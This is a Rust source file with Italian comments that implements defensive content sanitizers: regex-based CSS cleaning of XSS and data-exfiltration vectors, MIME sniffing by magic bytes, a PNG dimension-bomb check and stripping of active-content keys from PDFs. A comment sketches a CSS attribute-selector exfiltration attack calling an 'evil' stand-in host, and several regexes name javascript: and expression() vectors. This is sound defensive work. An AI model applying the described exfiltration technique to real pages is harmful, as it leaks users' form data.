use regex::Regex;
use lopdf::Document;
use crate::report::SanitizationAction;

/// Sanitizzatore dedicato ai fogli di stile CSS (sia inline nei tag <style> che file esterni .css)
pub struct CssSanitizer;

impl CssSanitizer {
    /// Pulisce una stringa CSS rimuovendo vettori di attacco XSS e di esfiltrazione dati.
    pub fn sanitize(css_content: &str) -> String {
        let mut cleaned = css_content.to_string();

        // 1. Neutralizza IE expression()
        // Cerca la parola "expression" seguita da parentesi.
        // Vettore di attacco classico su vecchie versioni di Internet Explorer.
        let re_expression = Regex::new(r"(?i)expression\s*\(.*?\)").unwrap();
        cleaned = re_expression.replace_all(&cleaned, "/* expression rimossa */").to_string();

        // 2. Neutralizza url(javascript:...)
        // Impedisce l'esecuzione di script tramite la proprietà background o content.
        let re_js_url = Regex::new(r"(?i)url\s*\(\s*['\x22]?javascript:.*?['\x22]?\s*\)").unwrap();
        cleaned = re_js_url.replace_all(&cleaned, "url('about:blank')").to_string();

        // 3. Neutralizza @import cross-origin o contenenti javascript
        // Blocca catene di @import esterne che potrebbero caricare stili malevoli a cascata
        // o eseguire javascript mascherato.
        let re_import = Regex::new(r"(?i)@import\s+(?:url\()?\s*['\x22]?(?:http:|https:|javascript:)[^;]+;").unwrap();
        cleaned = re_import.replace_all(&cleaned, "/* @import esterno bloccato */\n").to_string();

        // 4. Previene l'esfiltrazione dati (Data Leakage) tramite background: url(...)
        // Nel tuo scenario, l'attaccante usa input[value^='a'] { background: url('http://evil.../?v=a') }
        // per rubare dati form o cookie riga per riga. Blocchiamo gli URL HTTP/HTTPS esterni nei CSS.
        let re_external_url = Regex::new(r"(?i)url\s*\(\s*['\x22]?(?:http:|https:)[^)]*\)").unwrap();
        cleaned = re_external_url.replace_all(&cleaned, "url('about:blank')").to_string();

        cleaned
    }
}

#[derive(Debug, PartialEq)]
pub enum DetectedType {
    Html,
    Png,
    Pdf,
    Gzip,
    Unknown,
    Xml,
}

pub struct MimeSniffer;

impl MimeSniffer {
    /// Analizza i byte grezzi del contenuto per determinarne la vera natura,
    /// ignorando le dichiarazioni del server o le estensioni del file.
    pub fn sniff(raw_data: &[u8]) -> DetectedType {
        // 1. Controllo Magic Bytes del PNG
        // VERO file binario (se i byte sono puri)
        let png_magic: [u8; 8] = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A];

        // PNG letto come Stringa UTF-8 (il byte 0x89 non valido diventa '')
        let png_magic_utf8 = "\u{FFFD}PNG".as_bytes();

        if raw_data.starts_with(&png_magic) || raw_data.starts_with(png_magic_utf8) {
            return DetectedType::Png;
        }

        // 2. Controllo Magic Bytes del PDF
        // I PDF iniziano tipicamente con "%PDF-"
        if raw_data.starts_with(b"%PDF-") {
            return DetectedType::Pdf;
        }

        // 3. Controllo per l'HTML (Sniffing euristico)
        // L'HTML è testuale, quindi spesso inizia con spazi bianchi innocui. Li saltiamo.
        let mut start_idx = 0;
        while start_idx < raw_data.len() && matches!(raw_data[start_idx], 0x09 | 0x0A | 0x0C | 0x0D | 0x20) {
            start_idx += 1;
        }

        let text_data = &raw_data[start_idx..];

        // Estraiamo i primi 15 byte per cercare tag HTML comuni (ignorando maiuscole/minuscole)
        let snippet_len = std::cmp::min(text_data.len(), 15);
        if let Ok(snippet) = std::str::from_utf8(&text_data[..snippet_len]) {
            let upper_snippet = snippet.to_ascii_uppercase();
            // Se troviamo un tag tipico di apertura, è HTML
            if upper_snippet.starts_with("<!DOCTYPE") ||
                upper_snippet.starts_with("<HTML") ||
                upper_snippet.starts_with("<HEAD") ||
                upper_snippet.starts_with("<BODY") ||
                upper_snippet.starts_with("<SCRIPT") ||
                upper_snippet.starts_with("<H1") // Usato spesso nei test
            {
                return DetectedType::Html;
            }
        }

        // 4. controllo per gzip
        // Alcuni server restituiscono contenuti compressi. I file gzip iniziano con 0x1F 0x8B
        if raw_data.starts_with(&[0x1F, 0x8B]) {
            return DetectedType::Gzip;
        }

        // 5. controllo per XML
        // Gli XML iniziano con <?xml
        if raw_data.starts_with(b"<?xml") {
            return DetectedType::Xml;
        }

        // Se non corrisponde a nulla di noto, lo classifichiamo come sconosciuto
        DetectedType::Unknown
    }
}

pub struct ImageValidator;

impl ImageValidator {
    /// Previene attacchi di tipo "Dimension Bomb" leggendo l'header IHDR del PNG
    /// prima di qualsiasi operazione di rendering o decodifica.
    pub fn check_png_dimensions(bytes: &[u8]) -> Result<(), String> {
        // Un header PNG con IHDR è lungo minimo 24 byte.
        // Se è più piccolo, non ha dimensioni valide da leggere.
        if bytes.len() < 24 {
            return Ok(());
        }

        // Estraiamo Larghezza (byte 16-19) e Altezza (byte 20-23) in Big Endian
        let width = u32::from_be_bytes([bytes[16], bytes[17], bytes[18], bytes[19]]);
        let height = u32::from_be_bytes([bytes[20], bytes[21], bytes[22], bytes[23]]);

        // Calcoliamo i pixel totali (cast a u64 per evitare overflow matematici)
        let total_pixels = (width as u64) * (height as u64);

        // Calcoliamo l'impronta teorica in memoria (assumendo 4 byte per pixel RGBA)
        let uncompressed_memory = total_pixels * 4;

        // Impostiamo un limite di sicurezza severo, es. 50 MB (52_428_800 bytes)
        let max_memory: u64 = 50 * 1024 * 1024;

        if uncompressed_memory > max_memory {
            return Err(format!(
                "IMAGE_BOMB_PREVENTION: Immagine enorme dichiarata ({}x{}). Richiederebbe {} byte in RAM. Bloccata per prevenire T-6 (DoS).",
                width, height, uncompressed_memory
            ));
        }

        Ok(())
    }
}

pub struct PdfValidator;

impl PdfValidator {
    /// Implementazione rigorosa della "lopdf mode" richiesta dalle specifiche.
    /// Esegue il parsing completo del documento, individuando e rimuovendo (stripping)
    /// i dizionari di contenuto attivo (/JavaScript, /JS, /OpenAction, /AA).
    pub fn sanitize_pdf(bytes: &[u8]) -> Result<(Vec<u8>, Vec<SanitizationAction>), String> {
        // 1. Carichiamo il documento usando lopdf
        let mut doc = Document::load_mem(bytes).map_err(|e| format!("Errore parsing PDF: {:?}", e))?;

        let mut actions = Vec::new();

        // Chiavi tipiche per l'esecuzione di codice attivo nei PDF
        let active_keys: Vec<&[u8]> = vec![b"JavaScript", b"JS", b"OpenAction", b"AA"];

        // 2. Iteriamo su TUTTI gli oggetti del PDF
        for (object_id, object) in doc.objects.iter_mut() {
            // Se l'oggetto è un Dizionario, controlliamo le sue chiavi
            if let Ok(dict) = object.as_dict_mut() {
                for key in &active_keys {
                    // Se troviamo una chiave proibita, la rimuoviamo (strip)
                    if dict.remove(*key).is_some() {
                        actions.push(SanitizationAction {
                            rule_fired: "PDF_ACTIVE_CONTENT_STRIPPED".to_string(),
                            location: format!("PDF Object ID: {:?}", object_id),
                            original_fragment: String::from_utf8_lossy(key).to_string(),
                            replacement: "Stripped (lopdf mode)".to_string(),
                        });
                    }
                }
            }
        }

        // 3. Salviamo il PDF ripulito
        let mut out_buffer = Vec::new();
        doc.save_to(&mut out_buffer).map_err(|e| format!("Errore salvataggio PDF: {:?}", e))?;

        Ok((out_buffer, actions))
    }
}